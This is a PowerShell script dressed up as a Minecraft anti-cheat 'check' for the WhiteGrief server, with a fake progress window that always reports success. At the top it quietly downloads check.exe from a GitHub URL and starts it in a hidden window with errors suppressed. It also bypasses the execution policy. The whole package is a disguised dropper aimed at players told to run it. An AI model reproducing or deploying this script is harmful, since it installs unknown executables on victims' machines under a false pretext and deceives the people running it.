# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "check.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

# =============================================
#   ФЕЙКОВАЯ ПРОВЕРКА WHITEGRIEF
#   Визуальный скрипт для троллинга/прикола
# =============================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Создаём форму
$form = New-Object System.Windows.Forms.Form
$form.Text = "WhiteGrief | Проверка аккаунта"
$form.Size = New-Object System.Drawing.Size(800, 500)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 25)
$form.ForeColor = [System.Drawing.Color]::White
$form.Font = New-Object System.Drawing.Font("Consolas", 11)

# Заголовок
$title = New-Object System.Windows.Forms.Label
$title.Text = "█ WHITEGRIEF █`nПРОВЕРКА НА ЧИТЫ И ЛИЦЕНЗИЮ"
$title.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Lime
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(120, 30)
$form.Controls.Add($title)

# Подзаголовок
$sub = New-Object System.Windows.Forms.Label
$sub.Text = "Сервер: mc.WhiteGrief.pw | Версия: 1.21"
$sub.ForeColor = [System.Drawing.Color]::Gray
$sub.Location = New-Object System.Drawing.Point(200, 90)
$form.Controls.Add($sub)

# Прогресс-бар
$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(100, 150)
$progress.Size = New-Object System.Drawing.Size(600, 30)
$progress.Style = "Continuous"
$progress.Maximum = 100
$progress.Value = 0
$form.Controls.Add($progress)

# Статус
$status = New-Object System.Windows.Forms.Label
$status.Text = "Инициализация проверки..."
$status.ForeColor = [System.Drawing.Color]::Cyan
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(150, 200)
$form.Controls.Add($status)

# Лог
$logBox = New-Object System.Windows.Forms.TextBox
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 15)
$logBox.ForeColor = [System.Drawing.Color]::Lime
$logBox.Font = New-Object System.Drawing.Font("Consolas", 10)
$logBox.Size = New-Object System.Drawing.Size(600, 150)
$logBox.Location = New-Object System.Drawing.Point(100, 240)
$logBox.ReadOnly = $true
$form.Controls.Add($logBox)

# Кнопка "Пройти проверку" (фейковая)
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "▶ ПРОЙТИ ПРОВЕРКУ"
$btn.Size = New-Object System.Drawing.Size(300, 50)
$btn.Location = New-Object System.Drawing.Point(250, 410)
$btn.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 0)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.Font = New-Object System.Drawing.Font("Consolas", 12, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($btn)

# Анимация проверки
$lines = @(
    "[INFO] Подключение к WhiteGrief Anti-Cheat...",
    "[INFO] Проверка лицензии Microsoft...",
    "[WARN] Обнаружено подозрительное поведение!",
    "[INFO] Сканирование модов и текстур...",
    "[INFO] Проверка на Baritone, Wurst, Meteor...",
    "[SUCCESS] Читов не обнаружено",
    "[INFO] Проверка гриферского стажа...",
    "[SUCCESS] Ты настоящий грифер! Добро пожаловать на WhiteGrief"
)

$btn.Add_Click({
    $btn.Enabled = $false
    $progress.Value = 0
    
    foreach ($line in $lines) {
        Start-Sleep -Milliseconds 400
        $logBox.AppendText("$line`r`n")
        $progress.Value += [math]::Floor(100 / $lines.Count)
        $status.Text = $line
        $form.Refresh()
    }
    
    Start-Sleep -Milliseconds 800
    $status.ForeColor = [System.Drawing.Color]::Lime
    $status.Text = "ПРОВЕРКА ПРОЙДЕНА! ЗАГРУЗКА НА СЕРВЕР..."
    [System.Windows.Forms.MessageBox]::Show("Добро пожаловать на WhiteGrief!`n`nТы прошёл проверку.`nГриферь с удовольствием ❤️", "WhiteGrief", "OK", "Information")
})

# Показываем форму
[System.Windows.Forms.Application]::Run($form)
